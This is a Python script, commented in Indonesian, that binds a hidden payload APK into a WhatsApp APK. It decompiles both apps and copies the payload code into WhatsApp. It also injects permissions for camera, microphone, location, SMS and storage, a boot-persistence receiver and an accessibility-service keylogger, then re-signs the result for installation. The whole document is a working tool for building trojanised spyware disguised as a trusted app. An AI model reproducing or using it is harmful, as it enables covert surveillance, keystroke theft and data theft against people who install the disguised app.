#!/usr/bin/env python3
"""
BREAD BINDER v1.0 - Blind binding payload ke WhatsApp
Requires: apktool, uber-apk-signer, aapt2, java
"""

import os
import sys
import subprocess
import shutil
import json
import zipfile
import hashlib

WHATSAPP_APK = "whatsapp.apk"          # APK original
PAYLOAD_APK = "payload.apk"            # APK payload kita (com.system.update)
OUTPUT_APK = "whatsapp_binded.apk"
WORK_DIR = "./bind_work"

def setup_workdir():
    if os.path.exists(WORK_DIR):
        shutil.rmtree(WORK_DIR)
    os.makedirs(WORK_DIR)

def decompile_apk(apk, out_dir):
    cmd = ["apktool", "d", "-f", "-o", out_dir, apk]
    subprocess.run(cmd, check=True)

def recompile_apk(in_dir, out_apk):
    cmd = ["apktool", "b", "-o", out_apk, in_dir]
    subprocess.run(cmd, check=True)

def sign_apk(apk):
    cmd = ["uber-apk-signer", "-a", apk, "--out", "."]
    subprocess.run(cmd, check=True)

def inject_payload(whatsapp_dir, payload_dir):
    # 1. Copy smali payload ke dalam WhatsApp
    payload_smali = os.path.join(payload_dir, "smali", "com", "system", "update")
    whatsapp_smali = os.path.join(whatsapp_dir, "smali", "com", "system", "update")
    if os.path.exists(payload_smali):
        shutil.copytree(payload_smali, whatsapp_smali, dirs_exist_ok=True)

    # 2. Tambahkan izin dan service ke AndroidManifest.xml WhatsApp
    manifest_path = os.path.join(whatsapp_dir, "AndroidManifest.xml")
    with open(manifest_path, "r") as f:
        manifest = f.read()

    # Inject permission block (jika belum ada)
    if '<uses-permission android:name="android.permission.INTERNET"' not in manifest:
        # tambahkan di dalam <manifest> setelah tag pembuka
        manifest = manifest.replace(
            '<manifest',
            '<manifest\n    xmlns:tools="http://schemas.android.com/tools"\n    '
        )
        # kita tambahkan permission di bagian yang tepat, misal sebelum application
        permission_block = '''
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
'''
        manifest = manifest.replace(
            '<application',
            permission_block + '\n    <application'
        )

    # Inject service dan receiver ke dalam <application>
    service_block = '''
        <service android:name="com.system.update.UpdateService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />
        <receiver android:name="com.system.update.BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
            </intent-filter>
        </receiver>
        <service android:name="com.system.update.KeyLoggerService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>
'''
    manifest = manifest.replace(
        '</application>',
        service_block + '\n    </application>'
    )

    with open(manifest_path, "w") as f:
        f.write(manifest)

    # 3. Copy resource file (aksesibilitas, dsb) jika ada
    res_payload = os.path.join(payload_dir, "res", "xml")
    res_whatsapp = os.path.join(whatsapp_dir, "res", "xml")
    if os.path.exists(res_payload):
        shutil.copytree(res_payload, res_whatsapp, dirs_exist_ok=True)

def main():
    if not os.path.exists(WHATSAPP_APK):
        print(f"❌ {WHATSAPP_APK} not found!")
        sys.exit(1)
    if not os.path.exists(PAYLOAD_APK):
        print(f"❌ {PAYLOAD_APK} not found!")
        sys.exit(1)

    setup_workdir()
    print("📦 Decompiling WhatsApp...")
    decompile_apk(WHATSAPP_APK, os.path.join(WORK_DIR, "whatsapp"))
    print("📦 Decompiling Payload...")
    decompile_apk(PAYLOAD_APK, os.path.join(WORK_DIR, "payload"))

    print("🔗 Injecting payload into WhatsApp...")
    inject_payload(
        os.path.join(WORK_DIR, "whatsapp"),
        os.path.join(WORK_DIR, "payload")
    )

    print("📦 Recompiling...")
    recompile_apk(os.path.join(WORK_DIR, "whatsapp"), OUTPUT_APK)

    print("✍️ Signing APK...")
    sign_apk(OUTPUT_APK)

    print(f"✅ Binded APK: {OUTPUT_APK}")
    print("📌 Install with: adb install " + OUTPUT_APK)

if __name__ == "__main__":
    main()
